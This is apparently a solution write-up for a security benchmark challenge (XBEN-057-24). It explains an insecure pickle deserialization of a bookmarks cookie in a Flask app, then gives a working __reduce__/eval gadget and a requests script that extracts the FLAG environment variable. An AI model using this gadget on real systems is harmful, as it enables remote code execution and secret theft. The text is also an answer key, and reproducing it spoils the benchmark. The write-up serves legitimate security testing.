# XBEN-057-24 - URL Bookmarks

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Insecure deserialization (Python `pickle`) of a client-controlled
cookie, leading to remote code execution. `app/website/app/routes.py` (`/list`, `/add`,
`/delete`) all do:

```python
urls = base64.b64decode(request.cookies.get('bookmarks'))
urls = pickle.loads(urls)   # attacker fully controls this byte string
```

The flag is stored as an environment variable at app startup
(`app/website/app/__init__.py`: `os.environ["FLAG"] = '<flag>'`, per the hint "env is
key"). A crafted `__reduce__` gadget lets `pickle.loads()` both execute arbitrary code
*and* control the exact object graph returned, so we make it return a list of one
duck-typed "URL" object whose `.name` is `os.environ['FLAG']` — which
`list_urls.html` then renders directly:

```python
class Exploit:
    def __reduce__(self):
        code = ("[type('X',(object,),{'name': __import__('os').environ.get('FLAG',''), "
                 "'url':'pwned'})()]")
        return (eval, (code,))
```

`pickle.loads()` calls `eval(code)`, which builds and returns a one-item list of an
object with `.name` = the flag string, and that becomes the deserialized `urls` value used
by the `/list` template.

## Exploit

```python
import pickle, base64, requests

PORT = <PORT>   # e.g. 63441
BASE = f"http://localhost:{PORT}"

class Exploit:
    def __reduce__(self):
        code = ("[type('X',(object,),{'name': __import__('os').environ.get('FLAG',''), "
                 "'url':'pwned'})()]")
        return (eval, (code,))

payload = pickle.dumps(Exploit())
b64 = base64.b64encode(payload).decode('ISO-8859-1')

r = requests.get(BASE + "/list", cookies={"bookmarks": b64, "user": "attacker"})
print(r.text)
```
